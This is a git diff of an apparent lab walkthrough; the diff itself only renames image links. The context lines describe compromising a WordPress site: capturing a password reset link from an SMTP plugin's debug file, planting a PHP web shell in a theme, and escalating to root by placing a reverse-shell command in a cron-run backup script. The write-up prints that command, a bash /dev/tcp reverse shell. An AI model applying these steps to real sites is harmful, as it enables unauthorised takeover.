@@ -241,7 +241,7 @@ MariaDB [wordpress]> select * from wp_users;
 
 However, this hash was unable to be cracked. I also could not overwrite it in anyway. I tried to reset the password of the `admin` user, but I could not get the confirmation link:
 
-![](<../../../.gitbook/assets/image%20(3479).png>)
+![](../../../.gitbook/assets/maria-2.png)
 
 Seems like the only way to exploit this is to somehow capture that reset link. Within the `wp_options` table, I found another active plugin:
 
@@ -257,21 +257,21 @@ It seems that `easy-wp-smtp.php` is also enabled. And within the `swpsmtp_option
 
 This file is located at `/wp-content/plugins/easy-wp-smtp/`, and from it we can get the password reset link:
 
-![](<../../../.gitbook/assets/image%20(822).png>)
+![](../../../.gitbook/assets/maria-6.png)
 
 Once visited, we can reset the password of the `admin` and login:
 
-![](<../../../.gitbook/assets/image%20(3480).png>)
+![](../../../.gitbook/assets/maria-3.png)
 
 The exploit path to getting RCE from Wordpress is the same. (Appearance > Theme Editor > Replace 404.php with a PHP Web shell > Profit).
 
-![](<../../../.gitbook/assets/image%20(3975).png>)
+![](../../../.gitbook/assets/maria-5.png)
 
 > I reset the box here, so the IP addresses are different.
 
 From here, we can easily get a reverse shell.
 
-![](<../../../.gitbook/assets/image%20(3489).png>)
+![](../../../.gitbook/assets/maria-4.png)
 
 ## Privilege Escalation
 
@@ -304,4 +304,4 @@ bash -i >& /dev/tcp/192.168.45.162/80 0>&1
 
 Then we can place this within the `/var/www/html/wordpress/backup_scripts` directory as `backup-post` after running `chmod 777` on it. We would get a reverse shell as `root` after waiting for a bit:
 
-![](<../../../.gitbook/assets/image%20(2170).png>)
+![](../../../.gitbook/assets/maria-1.png)
